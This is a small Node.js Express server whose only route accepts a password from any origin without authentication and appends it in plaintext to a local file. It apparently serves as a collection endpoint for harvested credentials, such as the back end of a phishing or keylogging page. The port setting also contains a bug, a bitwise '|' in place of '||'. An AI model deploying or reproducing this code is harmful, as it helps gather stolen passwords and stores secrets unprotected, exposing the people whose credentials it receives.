const express = require("express");
const app = express();
const morgan = require("morgan");
const cors = require("cors");
const fs = require("fs");

app.use(cors());
app.use(morgan("tiny"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set("PORT", process.env.PORT | 8989);

app.post("/save", (req, res) => {
  const { password } = req.body;
  fs.appendFileSync("data.txt", `${password}\n`);
  res.status(200).end();
});

app.use((err, req, res, next) => {
  console.log(err);
  next();
});

app.listen(app.get("PORT"), () => {
  console.log("Listening on port", app.get("PORT"));
});
